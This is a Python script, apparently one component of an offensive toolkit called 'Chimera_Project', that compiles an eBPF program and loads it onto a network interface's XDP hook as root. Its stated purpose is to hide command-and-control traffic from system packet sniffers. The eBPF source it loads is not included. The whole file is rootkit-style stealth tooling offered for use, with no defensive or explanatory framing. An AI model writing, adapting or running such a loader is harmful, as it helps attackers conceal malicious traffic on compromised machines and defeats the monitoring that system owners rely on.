#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess

class BPFSniffer:
    """
    Agent 428: Kernel-Level Packet Stealth.
    Compiles and loads eBPF programs into the XDP hook 
    to make C2 traffic invisible to system sniffers.
    """
    def execute(self, interface="eth0"):
        print(f"--- [AGENT 428: BPF NETWORK STEALTH SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/428_BPF_Sniffer/src/filter.c"
        obj_out = "/home/dan/Chimera_Project/agents/428_BPF_Sniffer/src/filter.o"
        
        # 1. Compile to BPF Bytecode
        # Requires 'clang' and 'llvm'
        try:
            subprocess.run([
                "clang", "-O2", "-target", "bpf", "-c", src, "-o", obj_out
            ], check=True)
        except:
            print("[!] Compilation failed. Install clang/llvm and kernel headers.")
            return

        if os.getuid() != 0:
            print("[!] Critical: Loading XDP programs requires Root.")
            return

        # 2. Load the program into the interface
        # Requires 'iproute2' (ip link set)
        print(f"[*] Attaching XDP filter to {interface}...")
        subprocess.run(["ip", "link", "set", "dev", interface, "xdp", "obj", obj_out, "sec", "xdp"], check=True)
        
        print(f"[\033[92mSUCCESS\033[0m] C2 Traffic on {interface} is now a Kernel Ghost.")

if __name__ == "__main__":
    BPFSniffer().execute()
